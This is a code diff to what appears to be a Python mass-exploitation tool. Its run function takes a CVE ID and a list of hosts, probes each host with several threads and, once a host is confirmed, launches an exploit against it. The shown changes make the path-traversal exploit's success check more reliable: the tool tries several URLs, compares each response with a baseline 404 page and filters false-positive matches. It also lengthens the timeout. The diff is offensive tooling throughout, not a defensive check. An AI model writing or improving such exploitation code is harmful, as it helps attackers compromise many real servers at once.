@@ -251,11 +251,27 @@ def _exploit(base, ex, marker):
                 return True, "post_raw:%s" % cand, base + cand
         return False, "post_raw:no marker", ""
 
-    r = _req("GET", url)
-    text = getattr(r, "text", "") or ""
     rx = ex.get("success_regex", "")
-    hit = bool(rx) and re.search(rx, text) is not None
-    return hit, "traversal status:%s len:%d" % (getattr(r, "status_code", 0), len(text)), url
+    base404 = 0
+    try:
+        br = _req("GET", base + "/pbl-missing-" + rnd + ".php")
+        base404 = len(getattr(br, "text", "") or "")
+    except Exception:
+        pass
+    last = ""
+    for u in ex.get("urls") or [ex["url"]]:
+        r = _req("GET", base + u)
+        text = getattr(r, "text", "") or ""
+        last = "traversal status:%s len:%d" % (getattr(r, "status_code", 0), len(text))
+        if not rx:
+            continue
+        for m in re.finditer(rx, text):
+            tail = text[m.end():m.end() + 400]
+            if "sourceURL" not in tail[:120] and "language_urls" not in text[max(0, m.start() - 200):m.start()]:
+                return True, last, base + u
+        if base404 and abs(len(text) - base404) > base404 * 0.05:
+            return True, last + " (отличается от 404)", base + u
+    return False, last, ""
 
 
 def probe(host, v, tmo, marker):
@@ -290,6 +306,9 @@ def probe(host, v, tmo, marker):
     rec["state"] = "confirmed"
     sink(dict(rec))
 
+    if not v.get("exploit", {}).get("url"):
+        return rec
+
     try:
         ok, ev, vurl = _exploit(base, v.get("exploit", {}), marker)
     except Exception as e:
@@ -304,7 +323,7 @@ def probe(host, v, tmo, marker):
     return rec
 
 
-def run(cve_id, hosts, threads=8, tmo=30, limit=0, stop_fn=None):
+def run(cve_id, hosts, threads=8, tmo=90, limit=0, stop_fn=None):
     _STOP.clear()
 
     def _halt():
